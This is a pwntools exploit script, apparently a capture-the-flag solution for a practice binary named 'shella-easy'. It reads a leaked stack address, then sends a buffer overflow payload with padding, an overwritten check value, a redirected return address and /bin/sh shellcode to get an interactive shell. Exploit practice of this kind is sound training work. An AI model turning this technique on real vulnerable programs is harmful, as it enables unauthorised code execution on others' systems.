#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'
e = context.binary = ELF("/tmp/shella-easy", checksec=False)
p = process()


p.recvuntil(b" a ")
eip = int(p.recv(10), 16)
p.recvuntil(b" thanks\n")
log.success(f"Leak addr: {hex(eip)}")

jmp = asm("jmp $+80")
shell = asm(shellcraft.sh())
v5 = p32(0xdeadbeef)
payload = jmp + b'A'*(76 - 2 - 4 - 8) + v5 + b'B'*8 + p32(eip) + shell

input()
p.sendline(payload)

p.interactive()
